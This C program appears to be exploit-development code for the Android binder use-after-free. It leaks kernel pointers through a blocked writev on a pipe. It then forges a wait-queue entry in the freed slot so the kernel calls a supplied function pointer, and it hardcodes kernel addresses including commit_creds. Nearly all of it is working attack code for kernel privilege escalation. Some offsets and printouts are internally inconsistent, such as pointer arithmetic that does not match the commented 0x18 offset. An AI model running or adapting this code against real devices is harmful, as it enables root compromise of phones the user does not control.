#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sched.h>

/* Is a wake-up on the freed binder_thread's wait queue reachable at all?
 *
 * Everything measured so far (ledger S40/S41): the binder UAF gives a reliable leak
 * (pipe_write recomputes the current segment at every pipe-buffer boundary) but no
 * write to an address we choose -- __list_del only ever writes H into slot+0x50/0x58,
 * and recvmsg/readv do not honour a destination installed mid-iteration.
 *
 * The one primitive that would be worth having is __wake_up_common(), which walks
 * wq->head and calls curr->func(curr, mode, sync, key).  The head lives inside the
 * freed slot, i.e. inside OUR iovec array, and iovec[5].iov_base/iov_len ARE
 * head.next/head.prev -- values we set at syscall entry, before any mutation.  So if
 * anything calls wake_up(&thread->wait) after the thread is freed while our array
 * holds the slot, the kernel jumps to a function pointer we supplied with an argument
 * we supplied: the root primitive.
 *
 * This program answers that with a marker, not a crash: the fake entry's func is
 * printk and its first word is a plain ASCII string with no format specifiers.
 *   attempt 0: the stage-1 leak, to learn the slot address (head.next == slot+0x50)
 *   attempt 1: plant {fake+0x18, fake+0x18} in iovec[5] and idle in a blocked writev,
 *              then look for the marker in dmesg.
 * If the plant is right the list terminates cleanly; if the slot moved, the walk
 * continues past our entry -- that is the crash case, which is acceptable on this
 * bench device and still leaves the marker in the log.
 */
#define PAGE            0x1000
#define IOVEC_ARRAY_SZ  25
#define WQ              (0x48 / 16)
#define BINDER_THREAD_EXIT 0x40046208u
#define BLK             0x11000
#define MARK(j)         (0x10 + (j))
#define TX_MAP          (1 << 20)

#define PRINTK          0xffffffc000d8fad8UL
#define COND_RESCHED    0xffffffc000244944UL
#define COMMIT_CREDS    0xffffffc00023bb70UL

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code, flags;
    int32_t sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size, offsets_size;
    union { struct { binder_uintptr_t buffer, offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size, write_consumed, write_buffer;
    binder_size_t read_size, read_consumed, read_buffer;
};
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION    _IOW('c', 0, struct binder_transaction_data)

static char *fill, *stream;
static unsigned long *fake;       /* our forged wait_queue_t */
static unsigned long *sink;       /* where the entry's private points */

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16], rbuf[256];
    struct binder_transaction_data tr;
    struct binder_write_read bwr, bwr2;
    uint32_t cmd = BC_TRANSACTION;
    int rc, n;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    if ((rc = ioctl(fd, BINDER_WRITE_READ, &bwr))) { printf("  arm rc=%d errno=%d\n", rc, errno); return rc; }
    for (n = 0; n < 3; n++) {
        size_t off = 0;
        int complete = 0, reply = 0;
        memset(&bwr2, 0, sizeof bwr2);
        bwr2.read_size = sizeof rbuf;
        bwr2.read_buffer = (binder_uintptr_t)(uintptr_t)rbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
        while (off + 4 <= (size_t)bwr2.read_consumed) {
            uint32_t c;
            memcpy(&c, rbuf + off, 4);
            off += 4;
            if (c == 0x7206) complete = 1;
            else if (c == 0x80407203 || c == 0x80407202) { reply = 1; off += 64; }
        }
        printf("  drain %d: rc=%d rconsumed=%llu complete=%d reply=%d\n", n, rc,
               (unsigned long long)bwr2.read_consumed, complete, reply);
        if (rc) return rc;
        if (complete && !reply) return 0;
        if (reply) return -1;
    }
    return -1;
}

/* One attempt.  plant = 0 -> stage-1 leak; plant = 1 -> forged wait head, no DEL. */
static int attempt(int epfd, int plant, unsigned long head_val, unsigned long *learned)
{
    struct iovec iov[IOVEC_ARRAY_SZ];
    struct epoll_event ev = { .events = EPOLLIN };
    int pipefd[2] = { -1, -1 }, drainfd[2] = { -1, -1 };
    size_t total = 0;
    int j, fd, rc = -1;
    pid_t pid;
    ssize_t b;
    void *map;

    fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
    if (fd < 0) { perror("open binder"); return -1; }
    map = mmap(NULL, TX_MAP, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { perror("mmap binder"); close(fd); return -1; }

    /* Same shape as broot.c (stage 1), because the window offsets depend on it:
     * seg3 = 0x1000 marker, seg4 = the lock word (0 at entry -> kernel leaves 0x10001
     * after one lock/unlock), seg5 = the window (16384), seg6 = 0x10001 marker. */
    memset(iov, 0, sizeof iov);
    for (j = 0; j < IOVEC_ARRAY_SZ; j++) iov[j].iov_base = fill + (size_t)j * BLK;
    iov[WQ - 1].iov_len = 0x1000;
    iov[WQ].iov_len = 0;
    iov[WQ + 1].iov_len = 0x4000;
    iov[WQ + 2].iov_len = 0x10001;
    if (plant) {
        /* __wake_up_common() walks head->task_list.next, so only iovec[5].iov_base
         * (= head.next) has to be forged.  Keep every length a sane small number: the
         * entry-time access_ok() walks the whole iterator, and a pointer-sized length
         * overflows __range_ok() -> EFAULT before we ever block (measured). */
        iov[WQ + 1].iov_base = (void *)(uintptr_t)head_val;
        iov[WQ + 1].iov_len  = 0x100;
    }
    for (j = 0; j < IOVEC_ARRAY_SZ; j++) total += iov[j].iov_len;

    if (arm_pending_tx(fd)) goto out;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { perror("ep_add"); goto out; }
    if (pipe(pipefd) || pipe(drainfd)) { perror("pipe"); goto out; }
    if (fcntl(pipefd[1], F_SETPIPE_SZ, PAGE) < 0) perror("F_SETPIPE_SZ");
    if (plant) {
        /* Planting: prefill so writev blocks BEFORE anything is copied -- the array
         * keeps our forged head (there is no DEL to overwrite it). */
        char one[PAGE];
        memset(one, 0x9E, sizeof one);
        if (write(pipefd[1], one, sizeof one) != sizeof one) { perror("prefill"); goto out; }
    }
    /* Leaking: no prefill -- broot's shape, where segments 0..3 fill the single page
     * and the copy stalls at the lock word, so the DEL lands mid-iteration and the
     * following pages are copied through the kernel-rewritten iovec entries. */

    pid = fork();
    if (pid < 0) { perror("fork"); goto out; }
    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(pipefd[1]);
        close(drainfd[0]);
        sleep(plant ? 1 : 1);
        if (!plant) {
            alarm(4);
            if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev)) perror("child ep_del");
            alarm(0);
            b = read(pipefd[0], stream, 0x40000);
            printf("  child read %zd\n", b);
            if (b > 0)
                (void)!write(drainfd[1], stream, (size_t)b);
            close(pipefd[0]);
            close(drainfd[1]);
            close(fd);
            _exit(0);
        }
        /* plant mode: do NOT delete the wait entry (that is what writes H into the
         * array).  Just drain the pipe after a while so the parent's writev finishes
         * and the forged head has had time to be walked by any wake-up. */
        sleep(6);
        {
            char junk[PAGE];
            while (read(pipefd[0], junk, sizeof junk) > 0)
                ;
        }
        close(pipefd[0]);
        close(drainfd[1]);
        _exit(0);
    }
    close(pipefd[0]);
    close(drainfd[1]);

    errno = 0;
    if (ioctl(fd, BINDER_THREAD_EXIT, NULL)) { perror("THREAD_EXIT"); goto out; }
    alarm(plant ? 25 : 25);
    b = writev(pipefd[1], iov, IOVEC_ARRAY_SZ);
    printf("  writev -> %zd (total %zu) errno=%d\n", b, total, errno);
    alarm(0);
    if (!plant) {
        size_t got = 0, i, foreign = 0;
        while (got < 0x40000) {
            ssize_t n = read(drainfd[0], stream + got, 0x40000 - got);
            if (n <= 0) break;
            got += (size_t)n;
        }
        for (i = 0; i < got; i++) {
            int v = (unsigned char)stream[i];
            if (v < MARK(0) || v > MARK(IOVEC_ARRAY_SZ - 1)) foreign++;
        }
        printf("  leak: got=%zu foreign=%zu", got, foreign);
        {
            int shown = 0, found = 0;
            unsigned long first = 0;
            for (i = 0; i + 8 <= got; i += 8) {
                unsigned long v;
                memcpy(&v, stream + i, 8);
                if (v < 0xffffff8000000000UL || v > 0xffffffd000000000UL) continue;
                if (!found) first = v;
                found++;
                if (shown < 24) {
                    printf("    [%06zu] %016lx%s%s\n", i, v,
                           (v & 0x3fffUL) == 0 ? "   <== 16K-aligned: kernel stack / thread_info" : "",
                           (i == 0) ? "" : "");
                    shown++;
                }
            }
            printf("  kernel pointers found=%d first=%016lx (slotVA=%016lx)\n",
                   found, first, first ? first - 0x50 : 0);
            if (learned && first >= 0xffffffc000000000UL && (first & 0xffUL) == 0x50)
                *learned = first;
        }
    }
    {
        int st = 0;
        waitpid(pid, &st, 0);
        printf("  child status=%d\n", st);
    }
    rc = 0;
out:
    if (rc) alarm(0);
    if (map != MAP_FAILED) munmap(map, TX_MAP);
    if (pipefd[0] >= 0) close(pipefd[0]);
    if (pipefd[1] >= 0) close(pipefd[1]);
    if (drainfd[0] >= 0) close(drainfd[0]);
    if (drainfd[1] >= 0) close(drainfd[1]);
    close(fd);
    return rc;
}

int main(int argc, char **argv)
{
    unsigned long func = PRINTK;
    unsigned long head_val, learned = 0;
    int epfd, t;
    unsigned long slot_hint = argc > 2 ? strtoul(argv[2], NULL, 16) : 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    fill = calloc(IOVEC_ARRAY_SZ, BLK);
    stream = malloc(0x40000);
    fake = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    sink = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (!fill || !stream || fake == MAP_FAILED || sink == MAP_FAILED) { perror("alloc"); return 1; }
    for (t = 0; t < IOVEC_ARRAY_SZ; t++) memset(fill + (size_t)t * BLK, MARK(t), BLK);

    /* struct wait_queue_t { unsigned flags; void *private; int (*func)(...);
     *                        struct list_head task_list; }   -> task_list at +0x18 */
    if (argc > 1 && !strcmp(argv[1], "condresched"))
        func = COND_RESCHED;
    memcpy(fake, "BROOT5WAKE\n", 12);            /* printk's format string (no '%') */
    fake[1] = (unsigned long)sink;              /* private: harmless writable page  */
    fake[2] = func;                             /* the call we are testing          */
    fake[3] = 0;                                /* task_list.next, set below        */
    fake[4] = 0;                                /* task_list.prev, set below        */
    pin0();

    epfd = epoll_create(1000);
    printf("phase 0: stage-1 leak to learn the slot address\n");
    for (t = 0; t < 10 && !learned; t++) {
        printf(" leak round %d\n", t);
        attempt(epfd, 0, 0, &learned);
    }
    if (argc > 1 && !strcmp(argv[1], "leakonly")) return 0;
    if (!learned) printf("  (no slot learned: the forged entry will not terminate the walk;\n"
           "   the marker is still printed first, and any oops backtrace names the waker)\n");
    printf("phase 1: forged head.next = fake+0x18, entry.next = slot+0x50 = %016lx "
           "(fake=%p func=%016lx)\n", slot_hint + 0x50, (void *)fake, func);
    head_val = (unsigned long)(fake + 0x18);
    fake[3] = learned;                          /* 0 => walk runs off after the marker */
    fake[4] = learned ? learned : (unsigned long)(fake + 0x18);
    printf("  entry.next=%016lx entry.prev=%016lx  (0 means: accept the oops-after-marker)\n",
           fake[3], fake[4]);
    attempt(epfd, 1, head_val, NULL);
    printf("now check: dmesg | grep BROOT5WAKE\n");
    return 0;
}
